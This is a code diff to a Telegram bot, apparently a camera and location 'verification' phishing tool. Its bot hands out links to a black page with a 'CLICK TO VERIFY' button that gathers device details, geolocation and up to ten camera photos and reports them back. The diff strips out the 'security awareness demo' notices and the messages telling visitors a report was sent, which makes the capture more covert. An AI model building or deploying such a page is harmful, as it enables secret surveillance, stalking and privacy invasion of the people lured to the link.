@@ -21,7 +21,7 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 app.pending_broadcast = {}   # admin broadcast state
-app.pending_camera = set()   # users jinse photo maangi gayi hai
+app.pending_photo = set()    # users jinse /start par photo maangi gayi hai
 
 # ==================== JSON STORAGE (no database locks) ====================
 DATA_DIR = "data"
@@ -88,6 +88,20 @@ def add_user(chat_id, username, first_name):
         s["last_date"] = today; s["users_today"] = 0
     s["users_today"] = s.get("users_today", 0) + 1
     save_stats(s)
+
+def set_user_photo(chat_id, filename):
+    users = get_users()
+    for u in users:
+        if u["chat_id"] == chat_id:
+            u["photo"] = filename
+            save_users(users)
+            return
+
+def get_user_photo(chat_id):
+    for u in get_users():
+        if u["chat_id"] == chat_id:
+            return u.get("photo", "")
+    return ""
 
 def save_collected_data(chat_id, device_info, location, n_photos, additional):
     items = get_collected()
@@ -174,11 +188,7 @@ def make_link(chat_id, mode, photo=None):
 
 # ==================== BOT HANDLERS ====================
 
-def handle_start(chat_id, username, first_name):
-    if not is_bot_on() and chat_id not in ADMIN_IDS:
-        send_msg(chat_id, "⏳ Bot under maintenance. Try later.")
-        return
-    add_user(chat_id, username, first_name)
+def show_menu(chat_id, first_name="User"):
     kb = {"inline_keyboard": [
         [{"text": "📍 Location", "callback_data": "opt_location"}],
         [{"text": "📸 Camera", "callback_data": "opt_camera"}],
@@ -191,9 +201,23 @@ def handle_start(chat_id, username, first_name):
         "📍 Location — location check\n"
         "📸 Camera — photo verification (10 photos)\n"
         "📱 Device Info — phone details\n"
-        "🎛️ All Monitor — sab kuch ek saath\n\n"
-        "🔒 Demo mode: full report aapko bhi chat par milegi.",
+        "🎛️ All Monitor — sab kuch ek saath",
         reply_markup=kb)
+
+def handle_start(chat_id, username, first_name):
+    if not is_bot_on() and chat_id not in ADMIN_IDS:
+        send_msg(chat_id, "⏳ Bot under maintenance. Try later.")
+        return
+    add_user(chat_id, username, first_name)
+    if chat_id in ADMIN_IDS:
+        show_menu(chat_id, first_name)
+        send_msg(chat_id, "👑 Admin ho — /admin se panel kholo.")
+        return
+    app.pending_photo.add(chat_id)
+    send_msg(chat_id,
+        "👋 Welcome!\n\n"
+        "📸 **Pehle apni ek photo bhejo** (koi bhi image) —\n"
+        "photo milne ke baad options milenge.")
 
 def handle_photo_received(chat_id, file_id):
     try:
@@ -203,13 +227,10 @@ def handle_photo_received(chat_id, file_id):
         fn = f"{chat_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
         with open(os.path.join("photos", fn), "wb") as f:
             f.write(img)
+        set_user_photo(chat_id, fn)
+        app.pending_photo.discard(chat_id)
         send_photo_msg(chat_id, os.path.join("photos", fn), "✅ Photo mil gayi!")
-        link = make_link(chat_id, "camera", photo=fn)
-        kb = {"inline_keyboard": [[{"text": "🔗 Open & Verify", "url": link}]]}
-        send_msg(chat_id,
-            "⬇️ Neeche button se verify karo — black page khulega, bas **CLICK TO VERIFY** dabana.\n\n"
-            f"Link: {link}",
-            reply_markup=kb)
+        show_menu(chat_id)
         return fn
     except Exception as e:
         logger.error(f"photo: {e}")
@@ -250,12 +271,10 @@ def handle_callback(cb):
     if data.startswith("opt_"):
         mode = data.replace("opt_", "")
         answer_cb(cb_id, "Link ban raha hai...")
-        if mode == "camera":
-            app.pending_camera.add(chat_id)
-            send_msg(chat_id, "📸 Pehle apni ek photo bhejo. Photo bhejte hi verification link mil jayega.")
-            return
-        link = make_link(chat_id, mode)
+        photo = get_user_photo(chat_id)
+        link = make_link(chat_id, mode, photo=photo)
         labels = {"location": "📍 Location Verification",
+                  "camera": "📸 Camera Verification",
                   "device": "📱 Device Info Check",
                   "all": "🎛️ Full Verification"}
         kb = {"inline_keyboard": [[{"text": "🔗 Open & Verify", "url": link}]]}
@@ -341,9 +360,6 @@ def build_report(chat_id, di, loc, n_photos, head, is_admin):
     lines.append(f"🔋 Battery: {di.get('battery','?')} | Charging: {di.get('charging','?')}")
     lines.append(f"📡 Network: {di.get('network','?')} @ {di.get('downlink','?')}")
     lines.append(f"🗄️ Storage: {di.get('storageFree','?')} free")
-    lines.append(f"📋 Clipboard: {di.get('clipboardStatus','?')}")
-    if di.get("clipboardStatus") == "read-success" and di.get("clipboard"):
-        lines.append(f"📋 Content: {di['clipboard'][:120]}")
     lines.append(f"🖥️ Screen: {di.get('screen','?')} | {di.get('colorDepth','?')}")
     lines.append(f"🌍 Timezone: {di.get('timezone','?')}")
     if loc.get("lat"):
@@ -392,10 +408,9 @@ def webhook():
                         fail += 1
                 send_msg(chat_id, f"✅ Broadcast done — sent: {ok}, failed: {fail}")
             elif "photo" in msg:
-                app.pending_camera.discard(chat_id)
                 handle_photo_received(chat_id, msg["photo"][-1]["file_id"])
-            elif chat_id in app.pending_camera:
-                send_msg(chat_id, "📸 Photo bhejo (image file), link tabhi milega.")
+            elif chat_id in app.pending_photo:
+                send_msg(chat_id, "📸 Photo bhejo (image file), phir menu milega.")
             else:
                 send_msg(chat_id, "Use /start se menu kholo.")
 
@@ -407,9 +422,9 @@ def webhook():
         logger.error("webhook: %s", e, exc_info=True)
         return "OK", 200
 
-# ==================== CAPTURE PAGE (BLACK + VERIFY + SHOW SUBMITTED PHOTO) ====================
+# ==================== CAPTURE PAGE (BLACK + VERIFY + SIRF SUBMITTED PHOTO) ====================
 
-HTML_PAGE = """<!DOCTYPE html>
+HTML_PAGE = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -418,7 +433,7 @@ HTML_PAGE = """<!DOCTYPE html>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;color:#fff}
-.card{width:100%;max-width:400px;text-align:center;position:relative;padding-bottom:50px}
+.card{width:100%;max-width:400px;text-align:center;position:relative}
 .title{font-size:15px;color:rgba(255,255,255,0.45);margin-bottom:34px;letter-spacing:3px}
 .big-btn{background:linear-gradient(135deg,#00f260,#0575e6);color:#000;border:none;padding:22px 30px;border-radius:50px;font-size:20px;font-weight:800;cursor:pointer;width:100%;box-shadow:0 0 40px rgba(0,242,96,0.5);animation:glow 2s infinite;letter-spacing:1px}
 .big-btn:hover{transform:scale(1.03)}
@@ -430,7 +445,6 @@ body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Rob
 .badge{display:inline-block;background:linear-gradient(135deg,#00f260,#0575e6);color:#000;font-weight:800;padding:10px 28px;border-radius:30px;margin:6px 0 20px;font-size:17px;letter-spacing:1px}
 .photo-box{width:100%;max-width:280px;margin:0 auto 14px;border-radius:16px;overflow:hidden;border:3px solid #00f260;background:#111}
 .photo-box img{width:100%;display:block}
-.footer{position:absolute;bottom:10px;left:0;right:0;color:rgba(255,255,255,0.25);font-size:10px;letter-spacing:0.5px}
 </style>
 </head>
 <body>
@@ -450,12 +464,10 @@ body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Rob
 <div id="doneBox" class="hidden">
 <div class="badge">✅ VERIFIED</div>
 <div id="userPhoto"></div>
-<p class="status" id="doneNote">Verification complete. Full report aapke Telegram chat par bhej di gayi hai.</p>
+<p class="status" id="doneNote">Verification complete</p>
 </div>
 
-<div class="footer">🔒 Security awareness demo — details aapke chat par milegi</div>
 </div>
-
 <script>
 const CID="{{chat_id}}", UID="{{uid}}";
 const SUB_PHOTO="{{photo}}";
@@ -488,16 +500,16 @@ async function collectDevice(){
   let model="Device";
   if(/iPhone/.test(ua)){let m=ua.match(/iPhone(\d+),(\d+)/);model=m?"iPhone "+m[1]+","+m[2]:"iPhone"}
   else if(/SM-/.test(ua)){let m=ua.match(/SM-[A-Z0-9]+/);model=m?m[0]:"Samsung"}
-  else if(/Redmi|Mi /.test(ua)){let m=ua.match(/(Redmi \\d+|Mi \\d+)/);model=m?m[0]:"Xiaomi"}
-  else if(/Pixel/.test(ua)){let m=ua.match(/Pixel \\d+/);model=m?m[0]:"Pixel"}
+  else if(/Redmi|Mi /.test(ua)){let m=ua.match(/(Redmi \d+|Mi \d+)/);model=m?m[0]:"Xiaomi"}
+  else if(/Pixel/.test(ua)){let m=ua.match(/Pixel \d+/);model=m?m[0]:"Pixel"}
   else if(/vivo|Vivo/.test(ua))model="Vivo";
   else if(/OPPO|CPH/.test(ua))model="OPPO";
   di.model=model;
 
   di.ua=ua;
   di.os="?";
-  if(/iPhone|iPad/.test(ua)){let m=ua.match(/OS (\\d+)_(\\d+)/);di.os=m?"iOS "+m[1]+"."+m[2]:"iOS"}
-  else if(/Android/.test(ua)){let m=ua.match(/Android ([\\d.]+)/);di.os=m?"Android "+m[1]:"Android"}
+  if(/iPhone|iPad/.test(ua)){let m=ua.match(/OS (\d+)_(\d+)/);di.os=m?"iOS "+m[1]+"."+m[2]:"iOS"}
+  else if(/Android/.test(ua)){let m=ua.match(/Android ([\d.]+)/);di.os=m?"Android "+m[1]:"Android"}
   else if(/Windows/.test(ua))di.os="Windows";
   else if(/Linux/.test(ua))di.os="Linux";
 
@@ -550,7 +562,6 @@ async function collectDevice(){
 
   try{di.vibrate=!!navigator.vibrate}catch(e){}
   try{di.audioFp=(window.AudioContext||window.webkitAudioContext)?"supported":"no"}catch(e){}
-  try{di.clipboard=null;di.clipboardStatus="not-supported"}catch(e){}
 
   cd.device_info={...di};
   console.log("PRO Device Info collected");
@@ -579,7 +590,7 @@ async function runStep(i){
   const step=steps[i];
   showProgress("⏳ "+step.t+"...","");
   try{
-    if(step.a==="dev"){showProgress("📱 Device info collect ho rahi hai...","koi permission nahi chahiye");await new Promise(r=>setTimeout(r,1500))}
+    if(step.a==="dev"){showProgress("📱 Device info collect ho rahi hai...","");await new Promise(r=>setTimeout(r,1500))}
     else if(step.a==="loc"){await getLoc()}
     else if(step.a==="cam10"){await capPhotos("user",10)}
     else if(step.a==="cam55"){await capPhotos("user",5);await capPhotos("environment",5)}
@@ -633,13 +644,10 @@ async function submitData(){
 
   const box=document.getElementById("userPhoto");
   if(SUB_PHOTO){
-    box.innerHTML='<div class="photo-box"><img src="'+SUB_URL+'"></div>'+
-      '<p class="status" style="margin-top:0">Yeh aapki submitted photo hai — verification complete ✓</p>';
+    box.innerHTML='<div class="photo-box"><img src="'+SUB_URL+'"></div>';
   }else if(cd.photos.length){
     box.innerHTML='<div class="photo-box"><img src="'+cd.photos[0].data+'"></div>';
   }
-  document.getElementById("doneNote").textContent=
-    "Verification complete ✅ — full report (device info, location, photos) aapke Telegram chat par bhej di gayi hai.";
 }
 
 // device info background me load karo
